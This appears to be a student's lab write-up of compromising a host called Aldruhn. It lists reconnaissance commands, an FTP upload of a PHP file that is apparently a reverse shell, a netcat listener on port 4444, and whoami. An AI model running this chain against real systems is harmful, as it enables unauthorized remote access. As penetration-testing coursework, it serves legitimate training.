# Aldruhn - 192.168.2.12
## Andrea Zonnekus 18758119

sudo nmap -sV -sV -O 192.168.2.12 -oN hosts

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.001.png)

sudo gobuster dir -u 192.168.2.12 -w /usr/share/dirb/wordlists/big.txt -o aldruhn\_http -x php,html,txt,xml

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.002.png)

http://192.168.2.12/security/

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.003.png)



sudo nikto --url 192.168.2.12 -o nikto --Format text

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.004.png)

davtest -url 192.168.2.12/webdav/

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.005.png)

ftp 192.168.2.12 21

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.006.png)

ls

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.007.png)

binary

windows\_best\_64x.php remote: windows\_best\_64x.php

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.008.png)



<http://192.168.2.12/windows_best_64x.php>

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.009.png)

nc -lvnp 4444

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.010.png)

whoami

![](aldruhn_steps/Aspose.Words.e60a3193-4cdb-4bd0-ba68-6b62b02a7cdc.011.png)




